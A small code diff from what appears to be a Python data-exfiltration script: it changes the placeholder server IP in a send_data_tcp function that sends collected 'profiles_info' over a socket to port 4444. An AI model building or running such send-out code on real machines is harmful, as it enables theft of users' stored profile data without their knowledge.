@@ -48,7 +48,7 @@ def save_to_txt(profiles_info):
 def send_data_tcp(profiles_info):
     logging.debug("Sending profiles via TCP Socket")
     try:
-        server_ip = "192.168.1.5"  # Replace with your actual server IP
+        server_ip = "192.168.0.0"  # Replace with your actual server IP
         server_port = 4444  # Replace with your actual server port
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect((server_ip, server_port))
